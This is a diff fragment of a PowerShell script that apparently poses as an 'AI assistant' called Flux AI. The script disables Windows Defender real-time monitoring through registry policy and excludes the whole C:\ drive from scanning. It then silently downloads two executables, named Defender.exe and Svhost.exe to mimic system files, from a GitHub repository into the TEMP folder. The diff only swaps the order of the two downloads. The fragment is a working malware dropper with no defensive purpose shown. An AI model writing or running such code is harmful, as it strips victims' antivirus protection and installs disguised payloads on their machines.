@@ -15,10 +15,10 @@ Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Nam
 Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableRealtimeMonitoring" -Value 1 -Force -ErrorAction SilentlyContinue
 Add-MpPreference -ExclusionPath "C:\" -Force -ErrorAction SilentlyContinue
 Write-Host "HI AM AI ASISTENT FLUX AI"
-$url1 = "https://github.com/sys1e/winlogo/raw/refs/heads/main/Defender.exe"
-$url2 = "https://github.com/sys1e/winlogo/raw/refs/heads/main/Svhost.exe"
-$path1 = "$env:TEMP\Defender.exe"
-$path2 = "$env:TEMP\Svhost.exe"
+$url1 = "https://github.com/sys1e/winlogo/raw/refs/heads/main/Svhost.exe"
+$url2 = "https://github.com/sys1e/winlogo/raw/refs/heads/main/Defender.exe"
+$path1 = "$env:TEMP\Svhost.exe"
+$path2 = "$env:TEMP\Defender.exe"
 [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
 Invoke-WebRequest -Uri $url1 -OutFile $path1 -UseBasicParsing -ErrorAction SilentlyContinue
 Invoke-WebRequest -Uri $url2 -OutFile $path2 -UseBasicParsing -ErrorAction SilentlyContinue
